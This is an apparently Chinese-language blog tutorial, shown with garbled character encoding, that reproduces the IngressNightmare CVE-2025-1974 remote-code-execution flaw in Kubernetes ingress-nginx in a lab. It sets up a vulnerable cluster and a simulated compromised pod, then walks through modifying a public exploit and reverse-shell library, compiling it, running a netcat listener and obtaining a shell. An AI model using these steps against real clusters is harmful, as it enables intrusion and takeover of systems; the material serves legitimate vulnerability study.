#  ã€äº‘å®‰å…¨ã€‘äº‘åŸç”Ÿ- K8S IngressNightmare CVE-2025-1974ï¼ˆæ¼æ´å¤ç°å®Œæ•´æ•™ç¨‹ï¼‰   
åŸåˆ› ä»‡è¾‰æ”»é˜²  ä»‡è¾‰æ”»é˜²   2025-04-17 03:45  
  
## æ¼æ´åŸç†  
```
https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
```  
  
æˆ‘ç†è§£åï¼Œæ€»ç»“æˆä¸¤æ–¹é¢ï¼š  
  
aã€é…ç½®æ³¨å…¥è¿‡ç¨‹  
1. æ„é€ ä¸€ä¸ªæ¶æ„çš„Ingressèµ„æºï¼Œå…¶ä¸­æ³¨å…¥ssl_engineæŒ‡ä»¤æŒ‡å‘æ¶æ„å…±äº«åº“  
  
1. å‘å‡†å…¥æ§åˆ¶å™¨éªŒè¯ç«¯ç‚¹ï¼ˆAdmissionWebhookï¼‰å‘é€AdmissionReviewè¯·æ±‚ï¼ˆåˆšæ‰çš„æ¶æ„Ingressèµ„æºï¼‰  
  
1. AdmissionWebhookéªŒè¯é€šè¿‡  
  
1. Ingress-NGINX Controllerç›‘å¬åˆ°Ingressèµ„æºå˜æ›´ï¼Œåœ¨å†…å­˜ä¸­ç”Ÿæˆé…ç½®æ–‡ä»¶  
  
1. Ingress-NGINX Controllerè°ƒç”¨ nginx -t å‘½ä»¤æ£€æŸ¥é…ç½®è¯­æ³•æ˜¯å¦åˆæ³•ï¼Œè§¦å‘RCEï¼Œåå¼¹shell  
  
bã€æŠ•é€’æ¶æ„å…±äº«åº“è¿‡ç¨‹  
1. ç¼–è¯‘æ¶æ„å…±äº«åº“  
  
1. æ„é€ ç‰¹æ®ŠHTTPè¯·æ±‚ï¼ˆæ—¨åœ¨è§¦å‘Nginxç‰¹æ€§ï¼‰æŠ•é€’æ¶æ„å…±äº«åº“  
  
1. Nginxå®ä¾‹å¤„ç†HTTPè¯·æ±‚ï¼Œç”±äºNginxç‰¹æ€§ç”Ÿæˆä¸´æ—¶æ–‡ä»¶ï¼ˆä¿æŒæ–‡ä»¶æè¿°ç¬¦FDæ‰“å¼€ï¼‰  
  
1. å¤šæ¬¡å‘é€AdmissionReviewè¯·æ±‚çˆ†ç ´æ–‡ä»¶æè¿°ç¬¦FDï¼ˆå³å¹¶å‘ä¸Šè¿°aè¿‡ç¨‹ï¼‰  
  
## ç¯å¢ƒæ­å»º  
  
  
ä¸€ã€å®‰è£…K8S  
  
ç‰ˆæœ¬é€‰æ‹©ï¼šå…ˆçœ‹Ingressæ¼æ´ç‰ˆæœ¬ï¼Œå€’æ¨K8Sç‰ˆæœ¬ï¼Œå‚è€ƒingress-nginxå®˜æ–¹é€‚é…è¡¨  
```
https://github.com/kubernetes/ingress-nginx
```  
<table><thead><tr><th align="center"><section><span leaf="">Supported</span></section></th><th><section><span leaf="">Ingress-NGINX version</span></section></th><th><section><span leaf="">k8s supported version</span></section></th><th><section><span leaf="">Alpine Version</span></section></th><th><section><span leaf="">Nginx Version</span></section></th><th><section><span leaf="">Helm Chart Version</span></section></th></tr></thead><tbody><tr><td align="center"><section><span leaf="">ğŸ”„</span></section></td><td><strong><span leaf="">v1.12.1</span></strong></td><td><section><span leaf="">1.32, 1.31, 1.30, 1.29, 1.28</span></section></td><td><section><span leaf="">3.21.3</span></section></td><td><section><span leaf="">1.25.5</span></section></td><td><section><span leaf="">4.12.1</span></section></td></tr><tr><td align="center"><section><span leaf="">ğŸ”„</span></section></td><td><strong><span leaf="">v1.12.0</span></strong></td><td><section><span leaf="">1.32, 1.31, 1.30, 1.29, 1.28</span></section></td><td><section><span leaf="">3.21.0</span></section></td><td><section><span leaf="">1.25.5</span></section></td><td><section><span leaf="">4.12.0</span></section></td></tr><tr><td align="center"><section><span leaf="">ğŸ”„</span></section></td><td><strong><span leaf="">v1.12.0-beta.0</span></strong></td><td><section><span leaf="">1.32, 1.31, 1.30, 1.29, 1.28</span></section></td><td><section><span leaf="">3.20.3</span></section></td><td><section><span leaf="">1.25.5</span></section></td><td><section><span leaf="">4.12.0-beta.0</span></section></td></tr><tr><td align="center"><section><span leaf="">ğŸ”„</span></section></td><td><strong><span leaf="">v1.11.5</span></strong></td><td><section><span leaf="">1.30, 1.29, 1.28, 1.27, 1.26</span></section></td><td><section><span leaf="">3.21.3</span></section></td><td><section><span leaf="">1.25.5</span></section></td><td><section><span leaf="">4.11.5</span></section></td></tr><tr><td align="center"><section><span leaf="">ğŸ”„</span></section></td><td><strong><span leaf="">v1.11.4</span></strong></td><td><section><span leaf="">1.30, 1.29, 1.28, 1.27, 1.26</span></section></td><td><section><span leaf="">3.21.0</span></section></td><td><section><span leaf="">1.25.5</span></section></td><td><section><span leaf="">4.11.4</span></section></td></tr><tr><td align="center"><section><span leaf="">ğŸ”„</span></section></td><td><strong><span leaf="">v1.11.3</span></strong></td><td><section><span leaf="">1.30, 1.29, 1.28, 1.27, 1.26</span></section></td><td><section><span leaf="">3.20.3</span></section></td><td><section><span leaf="">1.25.5</span></section></td><td><section><span leaf="">4.11.3</span></section></td></tr><tr><td align="center"><section><span leaf="">ğŸ”„</span></section></td><td><strong><span leaf="">v1.11.2</span></strong></td><td><section><span leaf="">1.30, 1.29, 1.28, 1.27, 1.26</span></section></td><td><section><span leaf="">3.20.0</span></section></td><td><section><span leaf="">1.25.5</span></section></td><td><section><span leaf="">4.11.2</span></section></td></tr><tr><td align="center"><section><span leaf="">ğŸ”„</span></section></td><td><strong><span leaf="">v1.11.1</span></strong></td><td><section><span leaf="">1.30, 1.29, 1.28, 1.27, 1.26</span></section></td><td><section><span leaf="">3.20.0</span></section></td><td><section><span leaf="">1.25.5</span></section></td><td><section><span leaf="">4.11.1</span></section></td></tr><tr><td align="center"><section><span leaf="">ğŸ”„</span></section></td><td><strong><span leaf="">v1.11.0</span></strong></td><td><section><span leaf="">1.30, 1.29, 1.28, 1.27, 1.26</span></section></td><td><section><span leaf="">3.20.0</span></section></td><td><section><span leaf="">1.25.5</span></section></td><td><section><span leaf="">4.11.0</span></section></td></tr><tr><td align="center"><section><span leaf=""><br/></span></section></td><td><strong><span leaf="">v1.10.6</span></strong></td><td><section><span leaf="">1.30, 1.29, 1.28, 1.27, 1.26</span></section></td><td><section><span leaf="">3.21.0</span></section></td><td><section><span leaf="">1.25.5</span></section></td><td><section><span leaf="">4.10.6</span></section></td></tr><tr><td align="center"><section><span leaf=""><br/></span></section></td><td><strong><span leaf="">v1.10.5</span></strong></td><td><section><span leaf="">1.30, 1.29, 1.28, 1.27, 1.26</span></section></td><td><section><span leaf="">3.20.3</span></section></td><td><section><span leaf="">1.25.5</span></section></td><td><section><span leaf="">4.10.5</span></section></td></tr><tr><td align="center"><section><span leaf=""><br/></span></section></td><td><strong><span leaf="">v1.10.4</span></strong></td><td><section><span leaf="">1.30, 1.29, 1.28, 1.27, 1.26</span></section></td><td><section><span leaf="">3.20.0</span></section></td><td><section><span leaf="">1.25.5</span></section></td><td><section><span leaf="">4.10.4</span></section></td></tr><tr><td align="center"><section><span leaf=""><br/></span></section></td><td><strong><span leaf="">v1.10.3</span></strong></td><td><section><span leaf="">1.30, 1.29, 1.28, 1.27, 1.26</span></section></td><td><section><span leaf="">3.20.0</span></section></td><td><section><span leaf="">1.25.5</span></section></td><td><section><span leaf="">4.10.3</span></section></td></tr><tr><td align="center"><section><span leaf=""><br/></span></section></td><td><strong><span leaf="">v1.10.2</span></strong></td><td><section><span leaf="">1.30, 1.29, 1.28, 1.27, 1.26</span></section></td><td><section><span leaf="">3.20.0</span></section></td><td><section><span leaf="">1.25.5</span></section></td><td><section><span leaf="">4.10.2</span></section></td></tr><tr><td align="center"><section><span leaf=""><br/></span></section></td><td><strong><span leaf="">v1.10.1</span></strong></td><td><section><span leaf="">1.30, 1.29, 1.28, 1.27, 1.26</span></section></td><td><section><span leaf="">3.19.1</span></section></td><td><section><span leaf="">1.25.3</span></section></td><td><section><span leaf="">4.10.1</span></section></td></tr><tr><td align="center"><section><span leaf=""><br/></span></section></td><td><strong><span leaf="">v1.10.0</span></strong></td><td><section><span leaf="">1.29, 1.28, 1.27, 1.26</span></section></td><td><section><span leaf="">3.19.1</span></section></td><td><section><span leaf="">1.25.3</span></section></td><td><section><span leaf="">4.10.0</span></section></td></tr><tr><td align="center"><section><span leaf=""><br/></span></section></td><td><section><span leaf="">v1.9.6</span></section></td><td><section><span leaf="">1.29, 1.28, 1.27, 1.26, 1.25</span></section></td><td><section><span leaf="">3.19.0</span></section></td><td><section><span leaf="">1.21.6</span></section></td><td><section><span leaf="">4.9.1</span></section></td></tr><tr><td align="center"><section><span leaf=""><br/></span></section></td><td><section><span leaf="">v1.9.5</span></section></td><td><section><span leaf="">1.28, 1.27, 1.26, 1.25</span></section></td><td><section><span leaf="">3.18.4</span></section></td><td><section><span leaf="">1.21.6</span></section></td><td><section><span leaf="">4.9.0</span></section></td></tr><tr><td align="center"><section><span leaf=""><br/></span></section></td><td><section><span leaf="">v1.9.4</span></section></td><td><section><span leaf="">1.28, 1.27, 1.26, 1.25</span></section></td><td><section><span leaf="">3.18.4</span></section></td><td><section><span leaf="">1.21.6</span></section></td><td><section><span leaf="">4.8.3</span></section></td></tr><tr><td align="center"><section><span leaf=""><br/></span></section></td><td><section><span leaf="">v1.9.3</span></section></td><td><section><span leaf="">1.28, 1.27, 1.26, 1.25</span></section></td><td><section><span leaf="">3.18.4</span></section></td><td><section><span leaf="">1.21.6</span></section></td><td><section><span leaf="">4.8.*</span></section></td></tr><tr><td align="center"><section><span leaf=""><br/></span></section></td><td><section><span leaf="">v1.9.1</span></section></td><td><section><span leaf="">1.28, 1.27, 1.26, 1.25</span></section></td><td><section><span leaf="">3.18.4</span></section></td><td><section><span leaf="">1.21.6</span></section></td><td><section><span leaf="">4.8.*</span></section></td></tr><tr><td align="center"><section><span leaf=""><br/></span></section></td><td><section><span leaf="">v1.9.0</span></section></td><td><section><span leaf="">1.28, 1.27, 1.26, 1.25</span></section></td><td><section><span leaf="">3.18.2</span></section></td><td><section><span leaf="">1.21.6</span></section></td><td><section><span leaf="">4.8.*</span></section></td></tr><tr><td align="center"><section><span leaf=""><br/></span></section></td><td><section><span leaf="">v1.8.4</span></section></td><td><section><span leaf="">1.27, 1.26, 1.25, 1.24</span></section></td><td><section><span leaf="">3.18.2</span></section></td><td><section><span leaf="">1.21.6</span></section></td><td><section><span leaf="">4.7.*</span></section></td></tr><tr><td align="center"><section><span leaf=""><br/></span></section></td><td><section><span leaf="">v1.7.1</span></section></td><td><section><span leaf="">1.27, 1.26, 1.25, 1.24</span></section></td><td><section><span leaf="">3.17.2</span></section></td><td><section><span leaf="">1.21.6</span></section></td><td><section><span leaf="">4.6.*</span></section></td></tr><tr><td align="center"><section><span leaf=""><br/></span></section></td><td><section><span leaf="">v1.6.4</span></section></td><td><section><span leaf="">1.26, 1.25, 1.24, 1.23</span></section></td><td><section><span leaf="">3.17.0</span></section></td><td><section><span leaf="">1.21.6</span></section></td><td><section><span leaf="">4.5.*</span></section></td></tr><tr><td align="center"><section><span leaf=""><br/></span></section></td><td><section><span leaf="">v1.5.1</span></section></td><td><section><span leaf="">1.25, 1.24, 1.23</span></section></td><td><section><span leaf="">3.16.2</span></section></td><td><section><span leaf="">1.21.6</span></section></td><td><section><span leaf="">4.4.*</span></section></td></tr><tr><td align="center"><section><span leaf=""><br/></span></section></td><td><section><span leaf="">v1.4.0</span></section></td><td><section><span leaf="">1.25, 1.24, 1.23, 1.22</span></section></td><td><section><span leaf="">3.16.2</span></section></td><td><section><span leaf="">1.19.10â€ </span></section></td><td><section><span leaf="">4.3.0</span></section></td></tr><tr><td align="center"><section><span leaf=""><br/></span></section></td><td><section><span leaf="">v1.3.1</span></section></td><td><section><span leaf="">1.24, 1.23, 1.22, 1.21, 1.20</span></section></td><td><section><span leaf="">3.16.2</span></section></td><td><section><span leaf="">1.19.10â€ </span></section></td><td><section><span leaf="">4.2.5</span></section></td></tr></tbody></table>  
æ­å»ºK8så¯å‚ç…§æˆ‘ä¸Šç¯‡æ–‡ç« ï¼š  
  
[ã€äº‘å®‰å…¨ã€‘äº‘åŸç”Ÿ-centos7æ­å»º/å®‰è£…/éƒ¨ç½²k8s1.23.6å•èŠ‚ç‚¹](https://mp.weixin.qq.com/s?__biz=MzUyNTUyNTA5OQ==&mid=2247485198&idx=1&sn=3f747cf9be95588cb6a13f1f4a91374d&scene=21#wechat_redirect)  
  
  
æ­å»ºå®ŒK8sï¼Œå®‰è£…å¯¹åº”ç‰ˆæœ¬çš„ingressï¼Œå³1.6.4ï¼Œåˆšå¥½å¤„äºæ¼æ´ç‰ˆæœ¬å†…  
### äºŒã€å®‰è£…Ingress  
###   
  
æ¨èå¤§ä½¬ Dubito å¾®ä¿¡å…¬ä¼—å·â€œäº‘åŸç”Ÿå®‰å…¨æŒ‡åŒ—â€çš„æ–‡ç« ï¼Œå†™å¾—å¾ˆè¯¦ç»†ï¼  
  
[ã€æ¼æ´å¤ç°ã€‘IngressNightmare CVE-2025-1974 RCEæ¼æ´å¤ç°ï¼ˆä¸‡å­—é•¿æ–‡|å›¾æ–‡å¹¶èŒ‚|æœ‰æ‰‹å°±èƒ½è·Ÿï¼‰](https://mp.weixin.qq.com/s?__biz=MzIyMzM2MzE1OQ==&mid=2247483705&idx=1&sn=12bf0411f01ec4f8b031b220fa482a69&scene=21#wechat_redirect)  
  
  
1ã€ä¸‹è½½å¯¹åº”ç‰ˆæœ¬Ingressçš„deployment  
```
exportÂ http_proxy="http://192.168.48.1:7890"
exportÂ https_proxy="http://192.168.48.1:7890"

wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.6.4/deploy/static/provider/baremetal/deploy.yaml
```  
  
2ã€æ›´æ¢é•œåƒæº  
  
é¦–å…ˆï¼ŒæŸ¥è¯¢æ‰€éœ€é•œåƒÂ   
```
catÂ deploy.yaml | grep image:
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFI3Ld8FFEpk2uaVWqnGemvYj9XpzUfSFAHRVZNOPRBMyCZONRr7ibnXBfOllWvBzbkvibIT4Uzx2o0g/640?wx_fmt=png&from=appmsg "")  
  
å…¶æ¬¡ï¼Œä½¿ç”¨ä»¥ä¸‹é•œåƒåŒæ­¥ç«™  
æœç´¢å…³é”®è¯ï¼šingress-nginx/controller:v1.6.4ï¼Œæ›´æ”¹æˆè¯¥ç½‘ç«™çš„é•œåƒåœ°å€å³å¯  
```
#é•œåƒåŒæ­¥ç«™é“¾æ¥
https://docker.aityp.com/
```  
  
å¯¹åº”æ”¹æˆå¦‚ä¸‹ä¸‰æ¡  
```
swr.cn-north-4.myhuaweicloud.com/ddn-k8s/registry.k8s.io/ingress-nginx/controller:v1.6.4
swr.cn-north-4.myhuaweicloud.com/ddn-k8s/registry.k8s.io/ingress-nginx/kube-webhook-certgen:v20220916-gd32f8c343
swr.cn-north-4.myhuaweicloud.com/ddn-k8s/registry.k8s.io/ingress-nginx/kube-webhook-certgen:v20220916-gd32f8c343
```  
  
3ã€éƒ¨ç½²Ingress  
```
#éƒ¨ç½²å‰å…ˆå–æ¶ˆä»£ç†
unsetÂ http_proxy
unsetÂ https_proxy
#éƒ¨ç½²
kubectl apply -f deploy.yaml
#éªŒè¯
kubectl get all -n ingress-nginx
```  
  
éªŒè¯å‘ç°è¿™æ—¶PODå¤„äºpendingçŠ¶æ€ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹åŸå›   
```
kubectlÂ describe pod ingress-nginx-controller-85f587f9d4-bt58m -n ingress-nginx
```  
  
ä¸»è¦çœ‹Events  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFI3Ld8FFEpk2uaVWqnGemvYx2HEsyMpqwnCpQia4kgBYGZQwP1oiapdasmniaKPoxPEzmSPqyrlkI21A/640?wx_fmt=png&from=appmsg "")  
  
è¿™æ˜¯å› ä¸ºå•èŠ‚ç‚¹éƒ¨ç½²ï¼Œè€Œmasteré»˜è®¤å­˜åœ¨æ±¡ç‚¹è®¾ç½®ï¼Œå¯¼è‡´PODæ— æ³•è°ƒåº¦ï¼Œå¯é€šè¿‡å‘½ä»¤æŸ¥çœ‹å¹¶ç§»é™¤æ±¡ç‚¹  
```
kubectlÂ get node
kubectlÂ describe node master-1Â | grep Taint
kubectlÂ taint nodes master-1Â node-role.kubernetes.io/master:NoSchedule-
kubectlÂ describe node master-1Â | grep Taint
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFI3Ld8FFEpk2uaVWqnGemvY03D3WHpchzLkLdcMJgy7IBZTultpZqAZ7iaxGYZDCqghcfbSIPwrMqQ/640?wx_fmt=png&from=appmsg "")  
  
å†æ¬¡æŸ¥çœ‹ingressçŠ¶æ€ï¼ŒæˆåŠŸå®‰è£…ï¼  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFI3Ld8FFEpk2uaVWqnGemvYIucTp17fvE0YjCvqqzn9pV303KpFVwo7XyO4LyFEa2FXRHSUrZBw1g/640?wx_fmt=png&from=appmsg "")  
### ä¸‰ã€æ¨¡æ‹Ÿå¤±é™·POD  
###   
  
1ã€æœ¬åœ°Dockeræ‰“é•œåƒ  
```
catÂ <<EOF >Dockerfile
# ä½¿ç”¨å®˜æ–¹PythonåŸºç¡€é•œåƒ
FROM python:3.11.7
# è®¾ç½®å·¥ä½œç›®å½•
WORKDIR /app
# å®‰è£…httpxåº“
RUN pip install --no-cache-dir httpx
# è®¾ç½®å®¹å™¨å¯åŠ¨æ—¶è¿è¡Œçš„å‘½ä»¤
CMD ["python",Â "-c",Â "import httpx; import time; print('Httpx library is available'); time.sleep(9999999)"]
EOF


#æ„å»ºå‘½ä»¤
docker build -t python-test-ingress-nginx .
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFI3Ld8FFEpk2uaVWqnGemvY8Jzic4H78v4UnthC1ibUfUbDvBLRmQ8jgMEaJWALDibNdjEYwbicd1ymIA/640?wx_fmt=png&from=appmsg "")  
  
2ã€æŠŠ Docker é•œåƒå¯¼å…¥åˆ° K8s ç”¨çš„Â containerd  
```
docker save python-test-ingress-nginx | sudo ctr -n=k8s.io images import -

#ç¡®è®¤é•œåƒæ˜¯å¦å¯¼å…¥æˆåŠŸ
sudo ctr -n k8s.io imageÂ lsÂ | grep python
```  
  
Â 3ã€K8séƒ¨ç½²é•œåƒï¼Œæ¨¡æ‹Ÿå¤±é™·POD  
  
é¦–å…ˆï¼Œç¼–å†™deploymentæ–‡ä»¶python_deploy.yaml  
```
catÂ <<EOF >python_deploy.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
Â  name: python-app
Â  namespace: test
spec:
Â  replicas: 1
Â  selector:
Â  Â  matchLabels:
Â  Â  Â  app: python-app
Â  template:
Â  Â  metadata:
Â  Â  Â  labels:
Â  Â  Â  Â  app: python-app
Â  Â  spec:
Â  Â  Â  containers:
Â  Â  Â  - name: python-container
Â  Â  Â  Â  image: docker.io/library/python-test-ingress-nginx:latest
Â  Â  Â  Â  imagePullPolicy: Never
EOF
```  
  
å…¶æ¬¡ï¼Œæ‰§è¡Œå‘½ä»¤éƒ¨ç½²  
```
kubectl create nsÂ test
kubectl apply -f python_deploy.yaml
#éªŒè¯çŠ¶æ€
kubectl get pod -nÂ test
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFI3Ld8FFEpk2uaVWqnGemvY7G91gxSVWbZDcqOwYaaYn9ZSOeKbskC6db4zDNeibIVziaDYTMoWWhMA/640?wx_fmt=png&from=appmsg "")  
## æ¼æ´å¤ç°  
  
### ä¸€ã€å‡†å¤‡æ­¦å™¨ï¼ˆprepare toolsï¼‰  
  
  
1ã€ä¸‹è½½EXP  
```
https://github.com/yoshino-s/CVE-2025-1974
```  
```
exportÂ http_proxy="http://192.168.48.1:7890"
exportÂ https_proxy="http://192.168.48.1:7890"

gitÂ cloneÂ https://github.com/yoshino-s/CVE-2025-1974.git
cdÂ CVE-2025-1974/
```  
  
2ã€ä¿®æ”¹EXP  
```
vimÂ exploit.py
```  
  
ç”±äºæˆ‘è¿™é‡Œçš„ç¯å¢ƒæ˜¯æ¨¡æ‹Ÿå¤±é™·PODï¼ˆè´´è¿‘å®é™…ï¼‰ï¼Œå±äºé›†ç¾¤å†…éƒ¨ç½‘ç»œè®¿é—®ï¼Œæ— éœ€ç«¯å£è½¬å‘ï¼Œç”¨ç¬¬6ã€7è¡Œçš„URLå³å¯ï¼Œæ³¨é‡Š12ã€13è¡Œï¼›  
  
ä¿®æ”¹ç¬¬25ã€26è¡ŒPIDå€¼å’ŒFDå€¼ï¼Œæ ¹æ®ç»éªŒåˆ¤æ–­æˆ–è€…è¿›å…¥ingresså®¹å™¨æŸ¥çœ‹è¿›ç¨‹å¯çŸ¥PIDå€¼å¤§çº¦ä¸º26å¼€å§‹ï¼ŒFDå€¼å¤§çº¦ä¸º6å¼€å§‹  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFI3Ld8FFEpk2uaVWqnGemvYVmf8DjhKqPwsRuWLUicO4mUennCbYwQBibGfpWqibZ1HUvVdWCdNeZ9Vg/640?wx_fmt=png&from=appmsg "")  
  
å®Œå–„è„šæœ¬ï¼Œåˆ é™¤47è¡Œçš„ returnÂ   
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFI3Ld8FFEpk2uaVWqnGemvYSiajGf3kLHt8qCKb6mgA3bthkDZficv7mMGNeyN9xkBOeDvIG8H8XEkg/640?wx_fmt=png&from=appmsg "")  
  
ä¿®æ”¹shell.c  
```
vimÂ shell.c
```  
  
æœåŠ¡å™¨åœ°å€æ”¹æˆè‡ªå·±æ”»å‡»æœºçš„ç›‘å¬åœ°å€  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFIGUaNgr4ZW9m40a4icqdRs2vXicsnatO8YZAx0B5SFyNstVLuCDnEclibOkg7iaU2TH18ibr0xEheU5UA/640?wx_fmt=png&from=appmsg "")  
### äºŒã€æ‰“é€ æ­¦å™¨  
  
  
ç¼–è¯‘å‰ï¼Œå…ˆäº†è§£ingress-nginx controlleræ‰§è¡Œ.soæ–‡ä»¶ä¾èµ–çš„åº“ç‰ˆæœ¬ï¼Œç¼–è¯‘æ—¶æŒ‡å®šåŒæ ·çš„åº“ç‰ˆæœ¬  
```
kubectlÂ getÂ podÂ -n ingress-nginx

kubectlÂ execÂ -itÂ -n ingress-nginx ingress-nginx-controller-85f587f9d4-gwm8rÂ -- bash
#è¿›å…¥ingresså®¹å™¨ä¹‹åæ‰§è¡Œ
findÂ /Â -name "libcrypto.so*"Â 2>/dev/null
```  
  
ç¡®è®¤ingress-nginx controllerå®¹å™¨ä¸­åº“ç‰ˆæœ¬æ˜¯3ç‰ˆæœ¬Â   
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFI3Ld8FFEpk2uaVWqnGemvY73rrE2faU9Ekna14kicCiafAQfqNiabbTy0AeHlEHLxChyCtvBee5WC0Q/640?wx_fmt=png&from=appmsg "")  
  
åŒæ ·ï¼Œçœ‹ä¸€ä¸‹ç¼–è¯‘çš„æœºå™¨åº“ç‰ˆæœ¬ï¼Œå‘ç°æœ‰3ç‰ˆæœ¬å¯ä»¥ç”¨  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFI3Ld8FFEpk2uaVWqnGemvYnvAqzfREPZ0gpJXNCRibjpVPHQRIZwficVYlliaLib6UcOcLXZUlicOBR4w/640?wx_fmt=png&from=appmsg "")  
  
äºæ˜¯ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æŒ‡å®šåº“è¿›è¡Œç¼–è¯‘  
```
gcc -fPIC -Wall -shared -o shell.so shell.c /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/2/fs/usr/lib/x86_64-linux-gnu/libcrypto.so.3

#éªŒè¯
ldd shell.so
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFI3Ld8FFEpk2uaVWqnGemvY9GOGwBoBQ0zDKddawcGRezpb7LDwQZXxxBzn7cI2lQpXLZBmupRgIg/640?wx_fmt=png&from=appmsg "")  
### ä¸‰ã€ä¸Šä¼ æ­¦å™¨  
  
  
ä¸Šä¼ ä»¥ä¸‹ä¸‰ä¸ªæ–‡ä»¶åˆ°å¤±é™·POD  
```
#æŸ¥çœ‹PODåç§°
kubectl get pod -nÂ test
#ä¸Šä¼ 
kubectlÂ cpÂ ./shell.so -nÂ testÂ python-app-94bdc8d99-prz64:/app/
kubectlÂ cpÂ ./exploit.py -nÂ testÂ python-app-94bdc8d99-prz64:/app/
kubectlÂ cpÂ ./req.json -nÂ testÂ python-app-94bdc8d99-prz64:/app/

```  
### å››ã€æ”»å‡»æœºè¿›è¡Œç›‘å¬  
```
ncÂ -lvnpÂ 7788
```  
### äº”ã€attack  
###   
  
è¿›å…¥å¤±é™·PODæ‰§è¡ŒEXP  
```
kubectlÂ execÂ -it -nÂ testÂ python-app-94bdc8d99-prz64 -- bash

#è¿›å…¥PODåæ‰§è¡Œ
python exploit.py
```  
  
æˆåŠŸåå¼¹shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qqUYEYiclhFI3Ld8FFEpk2uaVWqnGemvYMSGg92icoHaz8PnLwB17qNPB8GhUXooGcVW1NMf5z05HAPge6xaPVTg/640?wx_fmt=png&from=appmsg "")  
###   
### æœ¬æ–‡ä»…ä»…ç»“åˆäº†CVE-2025-24514ï¼ˆauth-urlæ³¨é‡Šæ³¨å…¥ï¼‰å®ç°RCEï¼Œè¿˜å¯ä»¥ç»“åˆç»“åˆCVE-2025-1097ï¼ˆauth-tls-match-cnæ³¨é‡Šæ³¨å…¥ï¼‰ã€CVE-2025-1098ï¼ˆé•œåƒ UID æ³¨å…¥ï¼‰æ¥å®ç°ã€‚å„ä½å¸ˆå‚…æœ‰å…´è¶£ï¼Œå¯è‡ªè¡Œæ¢ç´¢ï¼  
  
  
